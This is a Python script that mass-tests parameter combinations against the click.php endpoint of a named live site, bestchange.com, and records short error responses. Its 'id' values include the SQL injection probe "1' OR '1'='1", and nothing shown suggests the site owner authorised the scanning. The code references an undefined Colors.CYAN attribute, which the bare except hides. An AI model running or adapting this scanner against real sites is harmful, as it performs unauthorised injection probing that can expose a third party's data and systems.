#!/usr/bin/env python3
"""
BestChange.com Mass Parameter Testing
Test all possible parameter combinations
"""

import requests
import time
import itertools

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class MassParameterTester:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 8
    
    def test_parameter_combinations(self):
        """Test various parameter combinations"""
        print(f"{Colors.BLUE}[*] Testing parameter combinations...{Colors.RESET}")
        
        params = {
            'id': ['1', '2', '999', '-1', "1' OR '1'='1"],
            'from': ['10', '20', '-1'],
            'to': ['58', '59', '-1'],
            'city': ['0', '1', '-1'],
        }
        
        endpoints = [
            f'{self.base_url}/click.php',
        ]
        
        count = 0
        for endpoint in endpoints:
            # Generate combinations
            keys = list(params.keys())
            values = [params[key] for key in keys]
            
            for combo in itertools.product(*values):
                try:
                    test_params = dict(zip(keys, combo))
                    response = self.session.get(endpoint, params=test_params, timeout=5)
                    count += 1
                    
                    # Check for errors
                    if 'error' in response.text.lower() and len(response.text) < 500:
                        self.findings.append({
                            'endpoint': endpoint,
                            'params': test_params,
                            'status': response.status_code,
                        })
                    
                    if count % 50 == 0:
                        print(f"{Colors.CYAN}[*] Tested {count} combinations...{Colors.RESET}")
                    
                    time.sleep(0.1)
                except:
                    continue
        
        print(f"{Colors.GREEN}[+] Tested {count} parameter combinations{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Mass Parameter Testing{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    tester = MassParameterTester()
    tester.test_parameter_combinations()
    
    if tester.findings:
        print(f"\n{Colors.YELLOW}Found {len(tester.findings)} interesting responses{Colors.RESET}")

if __name__ == "__main__":
    main()
